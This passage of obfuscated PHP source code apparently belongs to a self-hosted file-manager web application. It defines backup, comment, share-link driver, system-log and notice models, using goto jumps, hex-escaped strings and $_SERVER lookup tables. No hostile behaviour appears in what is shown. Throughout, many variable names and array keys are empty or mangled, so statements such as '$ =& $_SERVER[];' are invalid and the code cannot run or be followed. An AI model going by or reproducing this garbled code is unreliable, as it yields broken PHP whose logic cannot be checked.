$ꬲ)) { return !1; } if (!in_array($[$[851]], $Ŵ)) { return !1; } if (IO::exist($ʩ)) { return !0; } $ = get_path_father($ʩ); if (IO::exist($)) { $ꬲ[] = $[$[509]]; return !1; } $ɋ = array($[851] => $[$[851]], $[84] => array($[427], "{$}\x25")); $ = Model($[823])->where($ɋ)->field($[510])->select(); $ꬲ = array_merge($ꬲ, array_to_keyvalue($, $[12], $[509])); return !1; } private function _fileFilter($ѩ) { $ =& $_SERVER[]; if (empty($ѩ)) { return; } $ = array($[509] => array($[7], array_unique($ѩ))); $ͱ = Model($[859])->where($)->field($[181])->select(); foreach ($ͱ as $) { Model($[859])->remove($[$[181]], !1); } } private function storeIds() { $Ѿ =& $_SERVER[]; $å = Model($Ѿ[801])->listData(); $ = array(); $֟ź = $GLOBALS[$Ѿ[6]][$Ѿ[89]][$Ѿ[860]]; foreach ($å as $) { $˝ԯ = strtolower($[$Ѿ[95]]); if (!isset($֟ź[$˝ԯ])) { continue; } $Ĕ = $Ѿ[74] . (isset($֟ź[$˝ԯ]) ? $֟ź[$˝ԯ] : ucfirst($˝ԯ)); if (!class_exists($Ĕ)) { continue; } $[] = $[$Ѿ[443]]; } return $; } } goto aԝ; cЉ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\142\141\x63\153\x75\x70\x4c\151\163\x74"; public $field = array("\x69\x6f", "\x6e\x61\x6d\145", "\x73\164\141\164\165\x73", "\143\157\156\164\x65\x6e\x74", "\155\141\156\165\x61\154", "\162\145\163\x75\154\164", "\164\151\x6d\145\x46\162\x6f\155", "\x74\x69\x6d\x65\124\157"); public function config() { $ =& $_SERVER[]; $몶 = Model($[804])->get($[814]); $몶 = json_decode($몶, !0); $몶 = is_array($몶) ? $몶 : array(); if (!isset($몶[$[788]])) { $몶[$[788]] = $[88]; } unset($몶[$[1657]]); Action($[1910])->taskInit(); Model($[1656])->cacheClear(); $ѺŮ = $[1911]; $ = Model($[1912])->findByKey($[1675], $ѺŮ); if (!$) { $ = array(); } if (isset($[$[194]])) { $[$[194]] = json_decode($[$[194]], !0); } if (isset($몶[$[194]])) { $[$[194]][$[1660]] = $몶[$[194]]; unset($몶[$[194]]); } return array_merge($, $몶); } public function listData($ = false, $ = "\155\x6f\x64\151\146\x79\x54\151\x6d\x65", $ = false) { return parent::listData($, $, !0); } public function lastItem() { $ = $this->listData(); return !empty($[0]) ? $[0] : null; } public function kill($В) { $ =& $_SERVER[]; $ȋ = $this->listData($В); if (!$ȋ || empty($ȋ[$[32]])) { return !0; } Task::kill($[813]); Task::kill($[834]); Task::kill($[843]); $ا = $ȋ[$[32]]; $ч = TEMP_FILES . $[812] . $ا . $[8]; IO::remove($ч, !1); return $this->remove($В); } public function remove($ɼ) { $Ģ = $this->listData($ɼ); if (!$Ģ) { return !0; } return $this->backupRemove($Ģ); } private function backupRemove($) { parent::remove($[$_SERVER[][443]]); $ = $this->backupPath($); IO::remove($, !1); return !0; } private function backupPath($) { $ =& $_SERVER[]; $ = $[$[32]]; $΄ = Model($[804])->get($[805]); $廙 = substr(md5($[806] . $΄ . $), 0, 8); return "\173\x69\x6f\72{$[$[785]]}\175\57\144\x61\x74\x61\142\x61\163\145\57\x62\x61\143\x6b\x75\160\x2f" . $ . $[11] . $廙; } public function start() { $忍ܭ =& $_SERVER[]; if ($GLOBALS[$忍ܭ[6]][$忍ܭ[89]][$忍ܭ[1913]] != $忍ܭ[88]) { return !0; } $Ƿ = $this->config(); if (!$Ƿ || $Ƿ[$忍ܭ[1657]] != $忍ܭ[88]) { return !1; } $ = $this->process(); foreach ($ as $Є) { if ($Є) { return Task::restart($Є[$忍ܭ[443]]); } } $ = new Backup(); $˘ = $->db(); if ($˘) { $˘ = $->dbFile(); if ($˘ && $Ƿ[$忍ܭ[788]] == $忍ܭ[212]) { $˘ = $->file(); } } Backup::set(array($忍ܭ[784] => 1, $忍ܭ[795] => time())); return !0; } public function process() { $У =& $_SERVER[]; $Ƶ = array($У[791] => Task::get($У[813]), $У[796] => Task::get($У[834]), $У[214] => Task::get($У[843])); $¹ = !1; foreach ($Ƶ as &$) { if ($¹) { $ = !1; continue; } if ($) { $ = intval(_get($, $У[1692], 0)); if (time() - $ > 7200) { Task::kill($[$У[443]]); $¹ = !0; $ = !1; } } } return $Ƶ; } public function restore() { $ =& $_SERVER[]; ActionCall($[1099], !0, 1); ActionCall($[1099], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\155\145\x6e\x74"; protected $tableMeta = array("\x74\141\142\154\145\116\141\155\145" => "\143\x6f\155\155\145\156\164\x5f\x6d\x65\x74\141", "\x6d\x65\164\x61\x46\151\x65\154\144" => "\x63\x6f\x6d\x6d\x65\156\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Ƚ) { $յ =& $_SERVER[]; if ($Ƚ[$յ[1914]]) { $Ǜ = $this->where(array($յ[1915] => $Ƚ[$յ[1914]]))->find(); if (!$Ǜ || $Ǜ[$յ[178]] != $Ƚ[$յ[178]] || $Ǜ[$յ[538]] != $Ƚ[$յ[538]]) { return !1; } $this->where(array($յ[1915] => $Ƚ[$յ[1914]]))->setAdd($յ[1916], 1); } $Ƚ[$յ[1917]] = 0; $Ƚ[$յ[1916]] = 0; $Ƚ[$յ[784]] = 1; return $this->add($Ƚ); } public function commentCount($ߣ, $, $ꖃ = false) { $ =& $_SERVER[]; if (!$ߣ) { return array(); } if (is_string($ߣ) || is_int($ߣ)) { $ߣ = array($ߣ); } $՝ = array($[538], $[1918] => $[533]); $ = array($[538] => array($[7], $ߣ), $[178] => $); if ($ꖃ) { $[$[1687]] = $ꖃ; } $ȩ = $this->field($՝)->where($)->group($[538])->select(); return array_to_keyvalue($ȩ, $[538], $[533]); } public function starTarget($, $) { $ڇ =& $_SERVER[]; $ = $ + self::TYPE_STAR_OFFSET; $Ƞ = array($ڇ[1687] => USER_ID, $ڇ[178] => $, $ڇ[538] => $); $ڠ = $this->where($Ƞ)->find(); if ($ڠ) { return $this->where(array($ڇ[443] => $ڠ[$ڇ[443]]))->delete(); } $ӆ = array($ڇ[1914] => 0, $ڇ[1687] => USER_ID, $ڇ[784] => 1, $ڇ[788] => $ڇ[12], $ڇ[178] => $, $ڇ[538] => $, $ڇ[1917] => 0, $ڇ[1916] => 0); return $this->add($ӆ); } public function starTargetCount($ߤ, $) { $ޖʽ =& $_SERVER[]; $ = $ + self::TYPE_STAR_OFFSET; $ = $this->commentCount($ߤ, $); $ = $this->commentCount($ߤ, $, USER_ID); return array($ޖʽ[1919] => $, $ޖʽ[1920] => $); } public function starTargetUserList($֊, $̃) { $ =& $_SERVER[]; $ = $֊ + self::TYPE_STAR_OFFSET; $Ĥ = array($[538] => $̃, $[178] => $); $ = $this->where($Ĥ)->count(); $ȇʹ = array($[299] => $, $[1921] => array()); if (!$) { return $ȇʹ; } $̈ = $this->field($[1687])->where($Ĥ)->limit(500)->select(); $̈ = array_to_keyvalue($̈, $[12], $[1687]); $ȇʹ[$[1921]] = Model($[546])->userListInfo($̈); return $ȇʹ; } public function prasiseUserList($ư) { $Ў =& $_SERVER[]; $Ւ = array($Ў[1922] => $ư); $֤ = $this->where($Ւ)->find(); $曦 = _get($֤, $Ў[1917], 0); $ = array($Ў[299] => $曦, $Ў[1921] => array()); if (!$曦) { return $; } $ = Model($Ў[1923])->field($Ў[1687])->where($Ւ)->limit(500)->select(); $ = array_to_keyvalue($, $Ў[12], $Ў[1687]); $[$Ў[1921]] = Model($Ў[546])->userListInfo($); return $; } public function remove($㭞) { $Ί =& $_SERVER[]; $׵ = array($Ί[1915] => $㭞); $ͨ = $this->where($׵)->find(); if ($ͨ[$Ί[1914]]) { $this->where(array($Ί[1915] => $ͨ[$Ί[1914]]))->setAdd($Ί[1916], -1); } return $this->where($׵)->delete(); } public function edit($˷, $敃) { $޹壽 =& $_SERVER[]; $ = array($޹壽[1915] => $˷); return $this->where($)->save(array($޹壽[1924] => $敃)); } public function prasise($) { $ =& $_SERVER[]; $ = Model($[1925]); $Ư = array($[1915] => $, $[1678] => USER_ID); $ = $->where($Ư)->find(); if (!$) { $->add($Ư); $⋔Ũ = $this->where(array($[1915] => $))->setAdd($[1917], 1); } else { $->where($Ư)->delete(); $⋔Ũ = $this->where(array($[1915] => $))->setAdd($[1917], -1); } return $⋔Ũ; } public function targetInfo($䀟, $ԡ) { $ǉ =& $_SERVER[]; $ = array($ǉ[616] => $䀟, $ǉ[617] => $ԡ); $΁ = $this->where($)->count(); $ = "\x52\x49\x47\x48\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\143\157\x6d\x6d\x65\x6e\x74\137\x70\x72\141\151\x73\145\40\x73\164\141\162\x20\157\156\x20\143\157\x6d\x6d\145\x6e\x74\x2e\x63\x6f\155\x6d\145\x6e\164\x49\x44\x20\x3d\40\x73\164\141\x72\x2e\143\x6f\155\x6d\145\156\x74\x49\x44"; $ = $this->alias($ǉ[398])->where($)->join($, $ǉ[1926])->count(); $ꯞ = array($ǉ[1927] => $΁, $ǉ[1928] => $); return $ꯞ; } public function listData($د) { $ˈΞ =& $_SERVER[]; if (isset($د[$ˈΞ[1929]])) { if ($د[$ˈΞ[1929]]) { $د[$ˈΞ[1922]] = array($ˈΞ[1053], intval($د[$ˈΞ[1929]])); } unset($د[$ˈΞ[1929]]); } if (isset($د[$ˈΞ[1930]])) { if ($د[$ˈΞ[1930]]) { $د[$ˈΞ[1922]] = array($ˈΞ[1050], intval($د[$ˈΞ[1930]])); } unset($د[$ˈΞ[1930]]); } return $this->_listData($د); } private function _listData($) { $ߡ =& $_SERVER[]; $ = $this->where($)->_makeOrder()->selectPage(100); $this->_listAppendParent($[$ߡ[413]]); $this->_listAppendUser($[$ߡ[413]]); $this->_listAppendMeta($[$ߡ[413]]); return $; } private function _makeOrder() { $đ =& $_SERVER[]; $߿ = array($đ[1917], $đ[1916], $đ[215]); $Օ = Input::get($đ[498], $đ[7], $đ[465], $߿); $ס = Input::get($đ[499], $đ[7], $đ[1680], array($đ[1931], $đ[494])); $ͪ = $Օ . $đ[53] . $ס; return $this->order($ͪ); } private function _listAppendParent(&$) { $ =& $_SERVER[]; $Áσ = array_unique(array_to_keyvalue($, $[12], $[1914])); $Áσ = array_remove_value($Áσ, $[212]); if (!$Áσ) { return; } $ȏ = $this->where(array($[1915] => array($[7], $Áσ)))->select(); $ȏ = array_to_keyvalue($ȏ, $[1922]); foreach ($ as &$ɘ) { if (isset($ȏ[$ɘ[$[1914]]])) { $ɘ[$[1932]] = $ȏ[$ɘ[$[1914]]]; } } unset($ɘ); } private function _listAppendUser(&$ޜ) { $ =& $_SERVER[]; $➞ = array_unique(array_to_keyvalue($ޜ, $[12], $[1687])); $➞ = array_remove_value($➞, $[212]); if (count($➞) == 0) { return; } foreach ($ޜ as $ţ) { if (isset($ţ[$[1932]])) { $➞[] = $ţ[$[1932]][$[1687]]; } } $ = Model($[567])->userListInfo($➞); foreach ($ޜ as &$ţ) { $ţ[$[630]] = $[$ţ[$[1687]]]; if (isset($ţ[$[1932]])) { $ţ[$[1932]][$[630]] = $[$ţ[$[1932]][$[1687]]]; } } unset($ţ); } private function _listAppendMeta(&$ԃ) { $ =& $_SERVER[]; $쟥 = array_unique(array_to_keyvalue($ԃ, $[12], $[1922])); $쟥 = array_remove_value($쟥, $[212]); if (!$쟥) { return; } foreach ($ԃ as $) { if (isset($[$[1932]])) { $쟥[] = $[$[1932]][$[1922]]; } } $ƪݰ = $this->metaList($쟥); if (!$ƪݰ) { return !1; } foreach ($ԃ as &$) { $[$[507]] = $ƪݰ[$[$[1922]]]; if (isset($[$[1932]])) { $[$[1932]][$[507]] = $ƪݰ[$[$[1932]][$[1922]]]; } } unset($); } private function metaList($) { $ =& $_SERVER[]; if (!$) { return array(); } $ = array($[1922] => array($[7], $)); $ = Model($[1933])->where($)->select(); $ = array_to_keyvalue_group($, $[1922]); foreach ($ as $ => $Ϳ) { $ = array(); foreach ($Ϳ as $Ӆ) { $[$Ӆ[$[94]]] = $Ӆ[$[418]]; } $[$] = $; } return $ ? $ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\146\x69\x6c\145\137\x63\x6f\156\164\x65\156\x74\163"; protected $dataAuto = array(array("\143\x72\145\141\164\145\x54\151\x6d\x65", "\x74\151\155\145", "\x69\x6e\163\145\x72\x74", "\x66\x75\x6e\143\x74\x69\x6f\156")); } goto e۳; fݔܫ: class PathDriverDriverShareItem { public function __construct($㧖) { $this->pathParse = $㧖; } public function __call($ㅧՙ, $Ɓ߇) { $˿ =& $_SERVER[]; if (method_exists($this, $ㅧՙ)) { return; } $ف = call_user_func_array(array($˿[1382], $ㅧՙ), $Ɓ߇); $́ = array($˿[1383], $˿[1384], $˿[1385], $˿[1386], $˿[586], $˿[588], $˿[1387], $˿[107], $˿[1388], $˿[1389]); if (in_array($ㅧՙ, $́)) { $ف = $this->getPathOuter($ف); } return $ف; } public function copy($劽, $݊, $ȋ = false, $ퟝ = false) { return $this->copyMove($劽, $݊, $ȋ, $_SERVER[][586], $ퟝ); } public function move($˪, $ڡց, $߸ = false, $ = false) { return $this->copyMove($˪, $ڡց, $߸, $_SERVER[][588], $); } private function copyMove($, $, $ׂُ, $ۆ̶, $ = false) { $ =& $_SERVER[]; $ٷ = $; $ی = IO::driverMake($); if ($ی->pathParse[$[1190]]) { $ = $ی->pathParse[$[1190]]; } else { $ = $ٷ; } $ = IO::copyMove($, $, $ׂُ, $ۆ̶, $); $ = $this->getPathOuter($); return $; } public function pathThis($Ξ) { return get_path_this($this->pathParse[$_SERVER[][84]]); } public function pathFather($ڀݿ) { return get_path_father($this->pathParse[$_SERVER[][84]]); } public function iconvSystem($) { return $; } protected function infoParse($, $䰧Į = false) { $򂯃 =& $_SERVER[]; $ܧ = $this->pathParse[$򂯃[528]][$򂯃[1214]] . $this->pathParse[$򂯃[1207]]; if ($䰧Į) { $̏Ծ = IO::infoWithChildren($ܧ); } else { $̏Ծ = IO::info($ܧ); } $ȹ = $this->pathParse[$򂯃[528]]; return Action($򂯃[1380])->_shareItemeParse($̏Ծ, $ȹ); } public function listAll($蒇) { $ =& $_SERVER[]; $Ҝ = IO::listAll($蒇); $ = rtrim($this->pathParse[$[528]][$[1214]], $[8]); foreach ($Ҝ as &$±) { $±[$[84]] = $this->pathDriver . $[8] . ltrim(substr($±[$[84]], strlen($)), $[8]); } unset($±); return $Ҝ; } public function listAllSimple($, $ = false) { $ɷ =& $_SERVER[]; $ = $this->listAll($); $ = $this->pathParse[$ɷ[463]]; if (trim($, $ɷ[8]) == trim(get_path_father($), $ɷ[8])) { $ = !0; } return IO::init($ɷ[12])->listAllSimpleMake($, $, $); } public function getPathOuter($ƭ) { $ =& $_SERVER[]; $ = KodIO::parse($ƭ); if ($[$[33]] == KodIO::KOD_SHARE_ITEM) { return $[$[84]]; } $⟺ = KodIO::clear($ƭ); $ = KodIO::clear($this->pathParse[$[528]][$[1214]]); $ = substr($⟺, strlen($)); if (substr($⟺, 0, strlen($)) != $) { return !1; } return $this->pathParse[$[1208]] . $[8] . ltrim($, $[8]); } public function getType() { $ʖ =& $_SERVER[]; $ = str_replace($ʖ[74], $ʖ[12], get_class($this)); return strtolower($); } public function isTypeObject($։) { return IO::isTypeObject($։); } public function info($ķ蚹) { return $this->infoParse($ķ蚹); } public function infoAuth($) { return $this->infoParse($); } public function infoWithChildren($̟) { return $this->infoParse($̟, !0); } public function infoFull($) { return $this->infoParse($); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ܻ) { $this->pathParse = $ܻ; } protected function infoParse($ʵꃅ, $Ȧ = false) { $Ӣ =& $_SERVER[]; return Action($Ӣ[1213])->sharePathInfo($this->pathParse[$Ӣ[84]], !0, $Ȧ); } public function listPath($ƞ, $ = false) { $ =& $_SERVER[]; $Ҽťɘ = IO::listPath($ƞ, $); if (!$Ҽťɘ) { return $Ҽťɘ; } if (is_array($Ҽťɘ[$[1381]])) { $٬ = Action($[1390])->parsePathChildren($Ҽťɘ[$[1381]], array($[463] => $ƞ)); $Ҽťɘ[$[1381]] = Action($[1213])->shareItemInfo($٬); } foreach ($Ҽťɘ as $èݜ => $˾) { if (!in_array($èݜ, array($[83], $[82]))) { continue; } foreach ($˾ as $Б => $٬) { $٬ = Action($[1390])->parsePathChildren($٬, array($[463] => $ƞ)); $Ҽťɘ[$èݜ][$Б] = Action($[1213])->shareItemInfo($٬); } } return $Ҽťɘ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ڲȹ) { parent::__construct($ڲȹ); } } goto Cц; B݌ݎ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\114\x69\x67\150\164\101\160\x70"; public $modelType = "\123\x79\163\164\x65\x6d\117\160\x74\x69\x6f\156"; public $field = array("\x6e\141\155\145", "\x67\162\x6f\165\x70", "\144\x65\163\x63", "\143\157\x6e\x74\x65\x6e\164"); public function listData($모 = false, $ = "\155\157\x64\151\x66\171\124\x69\155\x65", $ֺ = true) { return parent::listData($모, $, $ֺ); } public function remove($) { $ԟھ = $this->findByName($); if (!$ԟھ) { return !1; } return parent::remove($ԟھ[$_SERVER[][443]]); } public function add($) { if ($this->findByName($[$_SERVER[][32]])) { return !1; } return parent::insert($); } public function update($, $ց) { $ =& $_SERVER[]; $ߕ = $this->findByName($); $ = $this->findByName($ց[$[32]]); if (!$ߕ || $ && $[$[443]] != $ߕ[$[443]]) { return !1; } return parent::update($ߕ[$[443]], $ց); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\137\x6c\x6f\x67"; protected $dataAuto = array(array("\143\162\145\141\164\145\x54\x69\x6d\145", "\x74\151\x6d\145", "\151\156\x73\x65\162\x74", "\146\x75\156\x63\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $щ =& $_SERVER[]; return array($щ[2221] => LNG($щ[2222]), $щ[2223] => LNG($щ[2224]), $щ[1828] => LNG($щ[2225]), $щ[2226] => LNG($щ[2227]), $щ[2228] => LNG($щ[2229]), $щ[2230] => LNG($щ[2231]), $щ[2232] => LNG($щ[2233]), $щ[1858] => LNG($щ[2233]), $щ[1859] => LNG($щ[2234]), $щ[2235] => LNG($щ[2236]), $щ[2237] => LNG($щ[2238]), $щ[2239] => LNG($щ[2240]), $щ[2241] => LNG($щ[2242]), $щ[1856] => LNG($щ[2243]), $щ[2244] => LNG($щ[2245]), $щ[1863] => LNG($щ[2246]), $щ[2247] => LNG($щ[2248]), $щ[2249] => LNG($щ[2250]), $щ[2251] => LNG($щ[2252]), $щ[2253] => LNG($щ[2254]), $щ[1866] => LNG($щ[2255]), $щ[1867] => LNG($щ[2256]), $щ[2257] => LNG($щ[2258]), $щ[2259] => LNG($щ[2260]), $щ[2261] => LNG($щ[2262]), $щ[1861] => LNG($щ[2263]), $щ[2264] => LNG($щ[2265]), $щ[1860] => LNG($щ[2266]), $щ[2267] => LNG($щ[2268]), $щ[2269] => LNG($щ[2270]), $щ[2271] => LNG($щ[2272]), $щ[2273] => LNG($щ[2273]), $щ[2274] => LNG($щ[1832]), $щ[2275] => LNG($щ[2276]), $щ[2277] => LNG($щ[2278]), $щ[2279] => LNG($щ[2280]), $щ[2281] => LNG($щ[2282]), $щ[2283] => LNG($щ[2284]), $щ[2285] => LNG($щ[2285]), $щ[2286] => LNG($щ[2287]), $щ[2288] => LNG($щ[2289]), $щ[2290] => LNG($щ[2291]), $щ[2292] => LNG($щ[2293]), $щ[2294] => LNG($щ[2295]), $щ[2296] => LNG($щ[2297])); } private function typeFile() { $ =& $_SERVER[]; $ = array($[1863] => array($[1864]), $[2239] => array($[2298]), $[2241] => array($[2299]), $[1856] => array($[1857], $[2300]), $[2249] => array(), $[2251] => array(), $[2253] => array(), $[1866] => array($[1868]), $[1867] => array($[1868]), $[2257] => array($[2301]), $[2259] => array($[2301]), $[2261] => array($[2302]), $[2247] => array($[2303]), $[1861] => array($[2304]), $[2264] => array($[2305]), $[1860] => array($[1862])); return $; } private function typeAll() { $ׯ =& $_SERVER[]; $ = $this->typeList; $֖ = array_filter($this->typeFile()); foreach ($֖ as $ܼ => $Сͣ) { $[$Сͣ[0]] = $[$ܼ]; } $[$ׯ[1868]] = LNG($ׯ[2306]); $[$ׯ[2301]] = LNG($ׯ[2307]); return $; } public function addLog($, $ = array()) { $즓 =& $_SERVER[]; if (!isset($this->typeList[$])) { return; } $⨩広 = isset($[$즓[1687]]) ? $[$즓[1687]] : 0; if (!$⨩広) { $⨩広 = Session::get($즓[2022]); } if ($ == $즓[2275] && is_array($[$즓[2308]]) && !$[$즓[2308]]) { return; } $ٻ = get_client_ip(); if (!$ || strlen(json_encode($)) >= 1024) { $ = array($즓[2309] => $ٻ); } else { if (is_array($)) { $[$즓[2309]] = $ٻ; } else { $ = array($즓[1243] => $, $즓[2309] => $ٻ); } } $ = array($즓[1677] => Session::sign(), $즓[1678] => intval($⨩広), $즓[33] => $, $즓[1680] => json_encode($)); parent::add($); } public function remove($ݔ) { $this->where(array($_SERVER[][461] => $ݔ))->delete(); } private function _makeOrder($ם = '') { $܌ =& $_SERVER[]; $ = $܌[215]; $ = array($܌[491] => $܌[492], $܌[493] => $܌[494]); $ = Input::get($܌[499], $܌[7], $܌[2058], array($܌[1976], $܌[493])); $ = $[$]; $ם = $ם . "{$}\x20{$}"; return $this->order($ם); } public function get($ѻĲ = '') { $դ =& $_SERVER[]; if (!$ѻĲ) { show_json(array()); } $ = array(); if ($ѻĲ[$դ[1687]]) { $[$դ[1687]] = $ѻĲ[$դ[1687]]; } if (isset($ѻĲ[$դ[794]])) { $愄 = $ѻĲ[$դ[794]]; $患 = isset($ѻĲ[$դ[795]]) ? $ѻĲ[$դ[795]] : time(); $[$դ[215]] = array($դ[377], array($愄, $患)); } if ($ѻĲ[$դ[33]]) { $ = explode($դ[50], $ѻĲ[$դ[33]]); $尩 = $this->typeFile(); $ = array(); foreach ($ as $ώƆ) { $[] = $ώƆ; if (isset($尩[$ώƆ])) { $ = array_merge($, $尩[$ώƆ]); } } $ = array_unique($); if ($) { $[$դ[33]] = array($դ[7], $); } } else { $[$դ[33]] = array($դ[2310], $դ[2311]); } if (!empty($ѻĲ[$դ[2309]])) { $[$դ[494]] = array($դ[427], "\45{$ѻĲ[$դ[2309]]}\45"); } $欑 = $this->_makeOrder()->where($)->selectPage(); if (empty($欑[$դ[413]])) { show_json(array(), !0, $欑[$դ[410]]); } $欑[$դ[413]] = $this->logList($欑[$դ[413]]); return $欑; } private function ipAddress(&$) { $ý =& $_SERVER[]; if (!empty($[$ý[2309]])) { $ = IpLocation::get($[$ý[2309]]); } else { $ = LNG($ý[2312]); } $[$ý[2313]] = $; } private function descZipDownload($, &$ɾ) { $ =& $_SERVER[]; if (!isset($[$[2314]])) { return; } $ = json_decode($[$[2314]], !0); foreach ($ as $ш΀) { try { $ = IO::infoFullSimple($ш΀[$[84]]); } catch (Exception $«) { continue; } $[$[84]] = $ш΀[$[84]]; $ɾ[] = $[$[181]] = $[$[181]]; $ɾ[] = $[$[2113]] = $[$[180]]; break; } return $; } private function getSourceList(&$Ջ) { $ =& $_SERVER[]; $߿ = array(); foreach ($Ջ as $ŉ => $) { $ܠ = json_decode($[$[494]], !0); if ($[$[33]] == $[1859]) { $ܠ = $this->descZipDownload($ܠ, $߿); $Ջ[$ŉ][$[494]] = json_encode($ܠ); continue; } if (strpos($[$[33]], $[2115]) !== 0) { if (!isset($ܠ[$[84]]) || strpos($[$[33]], $[2315]) !== 0) { continue; } try { $ = IO::infoFullSimple($ܠ[$[84]]); } catch (Exception $í) { continue; } $߿[] = $ܠ[$[181]] = $[$[181]]; $߿[] = $ܠ[$[2113]] = $[$[180]]; $Ջ[$ŉ][$[494]] = json_encode($ܠ); continue; } $߿[] = $ܠ[$[181]]; $߿[] = $ܠ[$[2113]]; if ($ܠ[$[33]] == $[588]) { $߿[] = $ܠ[$[494]][$[1199]]; $߿[] = $ܠ[$[494]][$[1200]]; } if ($ܠ[$[33]] == $[2123]) { $߿[] = $ܠ[$[494]][$[181]]; } } if (!$߿) { return array(); } return Model($[859])->sourceListInfo($߿, !0); } private function logList($׭) { $ =& $_SERVER[]; $ď = array_to_keyvalue($׭, $[12], $[1687]); $ۉ = Model($[567])->userListInfo(array_unique($ď)); $ = $this->getSourceList($׭); $╡ = $this->typeAll(); $С = array(); $ = array(); foreach ($׭ as $۾ => $Ǵ) { $Ұӆ = $Ǵ[$[33]]; $ = isset($ۉ[$Ǵ[$[1687]]]) ? $ۉ[$Ǵ[$[1687]]] : !1; $ = strpos($Ұӆ, $[2316]) === 0 ? LNG($[2317]) : LNG($[2312]); $Ǵ[$[32]] = isset($[$[32]]) ? $[$[32]] : LNG($[2312]); $Ǵ[$[2167]] = isset($[$[2167]]) ? $[$[2167]] : $[12]; $Ǵ[$[1584]] = isset($╡[$Ұӆ]) ? $╡[$Ұӆ] : $; $Ǵ[$[2057]] = $; $鎣 = json_decode($Ǵ[$[494]], !0); $Ǵ[$[2309]] = isset($鎣[$[2309]]) ? $鎣[$[2309]] : $[12]; $Ǵ[$[2313]] = IpLocation::get($Ǵ[$[2309]]); if (strpos($Ұӆ, $[2115]) === 0 || isset($鎣[$[2113]])) { $鎣[$[87]] = $[$鎣[$[181]]]; $鎣[$[2128]] = $[$鎣[$[2113]]]; if ($鎣[$[33]] == $[588]) { $鎣[$[494]][$[1199]] = $[$鎣[$[494]][$[1199]]]; $鎣[$[494]][$[1200]] = $[$鎣[$[494]][$[1200]]]; } if ($鎣[$[33]] == $[2123]) { $鎣[$[494]][$[181]] = $[$鎣[$[494]][$[181]]]; } if ($鎣[$[33]] == $[1854]) { $鎣[$[2128]] = $鎣[$[87]]; $鎣[$[2113]] = $鎣[$[2128]][$[181]]; $鎣[$[87]] = !1; $鎣[$[181]] = $[12]; } if ($鎣[$[87]] && $鎣[$[87]][$[178]] == $[179]) { $[] = $Ǵ[$[443]]; unset($׭[$۾]); continue; } if ($鎣[$[2128]] && $鎣[$[2128]][$[178]] == $[179]) { $[] = $Ǵ[$[443]]; unset($׭[$۾]); continue; } } $Ǵ[$[494]] = $鎣; unset($Ǵ[$[2318]]); $С[] = $Ǵ; } $this->clearSystemPathLog($); return $С; } private function clearSystemPathLog($ۤ) { $׺ =& $_SERVER[]; if (count($ۤ) == 0) { return; } $ = array($׺[443] => array($׺[7], array_unique($ۤ))); $this->where($)->delete(); } public function deviceList($ڸ, $ = 0) { $ŉ =& $_SERVER[]; $ = array($ŉ[1687] => $ڸ, $ŉ[215] => array($ŉ[1053], $), $ŉ[33] => $ŉ[1828]); $ڃ = array(); $Ǔ = $this->field($ŉ[2319])->where($)->order($ŉ[2126])->limit(50)->select(); foreach ($Ǔ as $ => $Ꞡ) { if ($ > 0 && abs($Ꞡ[$ŉ[215]] - $Ǔ[$ - 1][$ŉ[215]]) < 5) { continue; } $À = json_decode($Ꞡ[$ŉ[494]], !0); $Ꞡ[$ŉ[2309]] = isset($À[$ŉ[2309]]) ? $À[$ŉ[2309]] : $ŉ[12]; unset($À[$ŉ[2309]]); $ = $this->deviceType($À[$ŉ[2116]]); if (isset($ڃ[$])) { continue; } $Ꞡ[$ŉ[2313]] = IpLocation::get($Ꞡ[$ŉ[2309]]); $Ꞡ[$ŉ[494]] = $À; $ڃ[$] = $Ꞡ; } return array_values($ڃ); } public function deviceType($) { return $; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\156\157\x74\x69\143\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\x63\x6f\156\x74\x65\156\x74", "\141\x75\x74\150", "\155\x6f\x64\x65", "\164\x69\x6d\x65", "\x74\171\x70\x65", "\154\145\x76\x65\x6c", "\145\x6e\x61\142\154\145", "\x73\x6f\162\x74"); public function listData($˟ = false, $Ʒ = "\163\x6f\x72\164", $딝 = false) { return parent::listData($˟, $Ʒ, $딝); } public function add($㭈) { $ =& $_SERVER[]; $ِ = time(); if ($㭈[$[16]] == $[2320]) { $ِ = strtotime($㭈[$[194]]); } $㭈[$[194]] = $ِ; return parent::insert($㭈); } public function update($ĉ, $) { $挗њ =& $_SERVER[]; $ȏؕ = $this->listData($ĉ); if (!$ȏؕ) { return !1; } $ = time(); if ($[$挗њ[16]] == $挗њ[2320]) { $ = strtotime($[$挗њ[194]]); } $[$挗њ[194]] = $; return parent::update($ĉ, $); } public function remove($뫰) { $ = $this->listData($뫰); if (!$ || $[$_SERVER[][179]]) { return !1; } return parent::remove($뫰); } public function sort($, $Ǩ) { return parent::update($, $Ǩ); } public function enable($Ǥ, $ۡ) { return parent::update($Ǥ, array($_SERVER[][2321] => $ۡ)); } private function initUserOption() { $ǈ讨 =& $_SERVER[]; $this->optionType = $ǈ讨[2322]; $this->modelType = $ǈ讨[2323]; $this->field = array($ǈ讨[2324], $ǈ讨[32], $ǈ讨[194], $ǈ讨[33], $ǈ讨[2325], $ǈ讨[784], $ǈ讨[210]); } public function userNoticeGet($Ų = false) { $this->initUserOption(); return parent::listData($Ų, $_SERVER[][443], !0); } public function userNoticeAdd($) { $옴 =& $_SERVER[]; $this->initUserOption(); $ = $this->findByKey($옴[2324], $[$옴[443]]); if ($) { return !0; } $ܵض = array($옴[2324] => $[$옴[443]], $옴[32] => 